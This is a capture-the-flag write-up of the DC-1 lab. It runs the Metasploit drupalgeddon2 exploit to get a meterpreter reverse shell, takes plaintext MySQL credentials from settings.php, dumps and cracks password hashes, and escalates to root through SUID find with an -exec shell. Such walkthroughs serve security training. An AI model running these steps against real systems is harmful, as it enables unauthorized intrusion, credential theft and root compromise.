# DC-1

# Enumeration

First command I'll run is **netdiscover** to see which live hosts are currently running on the network. Just to confirm, I'll ping **192.168.77.130** which I can see is up and running successfully. After this, I can run a nmap scan with this command: **nmap -sC -sV -p- 192.168.77.130**. 

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/f64fe60f-67ee-4f2b-8dcd-6873561b49ed" />

I can see the web app running on port 80 is using version 7. I'll go ahead and paste the IP address into Firefox to see what the website looks like. **Drupal Site**.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/b9e7f531-e5fe-4790-a353-b50baa5f8446" />

I will then go back into the root terminal to run **searchsploit drupal 7** and see what vulnerabilities are associated with Drupal Site v7 in the Exploit-DB.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/626dbc56-b222-4dcb-abd7-dee2119ae2f9" />

Okay, now I can console into Metasploit by running **msfconsole**. I can then search for the exploit that was displayed in the Exploit-DB which was **drupalgeddon2**. I can see at the bottom it says to use the command **use exploit/unix/webapp/drupal_drupalgeddon2**. I am now within the exploit.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/1865b43b-3c5f-435b-941c-e6bc10a1f2ac" />

I tried setting the remote host **RHOSTS** to the target's IP but realized I never changed the local host **lhost** to the IP of the Kali Linux machine so I went ahead and rand this command: **set lhost 192.168.77.128**. What this does is it specifies the IP address my machine where a listener will be running to receive connections from the target system. The RHOSTS command specifies the IP address of the system I want to gain access to or exploit. Once this is all squared away, I can simply run this and it'll open a meterpreter shell.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/ac90d681-a4c9-4e43-ab1c-939937d413fa" />

I ran a **ls** command to see what was in the home directory. I found a file called **flag1.txt** which would be the first flag captured for the lab.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/f4a57d85-1a68-4b0c-91ef-6552ae5ea18d" />

I then saw a directory called **sites** so I ran the command **cd sites** to switch into that directory. I then saw another directory called **default** and switched to that directory. I finally ran a **cat ./settings.php** command and found flag 2. Within this file are the credentials for an account in a mysql database.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/a6ed7bbe-4893-4d75-8f0e-634fdcd0a509" />

Now that I know the mysql account credentials, I can put in the command **mysql -u dbuser -p**. The **-u** will log in as the user named dbuser and the **-p** asks for the password. Once I am prompted to enter the password, I'll then enter **R0ck3t**. I am now logged into a mysql account. I can then use the command **show databases;** to see what databases are available to the user I am logged in as. I can then use the command **use drupaldb** to enter that given DB. Following that, I can run **show tables;** to see what tables are available in the DB. After looking at all the different tables, I figured the users table would be best to analyze and could contain some useful information so I ran this command: **SELECT * FROM users;**. Now I can see all of the columns and rows in the table **users**.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/cc678f32-d524-428e-b9e4-899ccac00c4f" />

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/0b298bab-12ac-4cea-9039-8201c2e65003" />

The password is hashed and is under the column **pass**. I copy and pasted that hash into a hash cracking software online for quick decryption. I then got **53cr3t** as the password so I went back to the Drupal Site and logged in. Pretty sure there is supposed to be flag 3 once I am logged in but it doesn't seem to be here. This machine is quite old so it could have been updated and removed. I did a quick search online and found flag 3 should have contained some clues such as **FIND** and **PERMS**.
<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/6c950727-3c8e-44dc-b393-772b8d9305e0" />

# Privilege Escalation
I went back to the terminal to run a **cat /etc/passwd** command to check the users and saw flag4 towards the bottom and entered that directory. I then listed the files from that directory and read the file which was flag 4.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/37b02486-0dbf-4764-a8aa-f24a06577130" />

Time to switch back to the **/var/www** directory and run **find / -perm -u=s -type f 2> /dev/null**.
* **find /**- searches for files starting from the root of the file system.
* **-perm -u=s**- basically matches the specified permissions that follow where **u** is the owner of the file and **s** is the SUID bit. SUID means the file runs as the file owner.
* **-type f**- looks for regular files and excludes directories and any special files.
* **2> /dev/null**- redirects error messages to nowhere so I don't have to see them in the interface.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/1935e750-fe73-4a71-a59c-cf32771634cd" />

I can now run **find** as root user along with **-exec** to read the contents of thefinalflag.txt: **find /root -exec /bin/sh \;**. Find is one of the binary/file with SUID permission set so I can see the contents of /root using find: **find /root**. The last flag has been found.

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/00d0aa3d-cf7f-49b3-b8b9-73e2203fcdd6" />

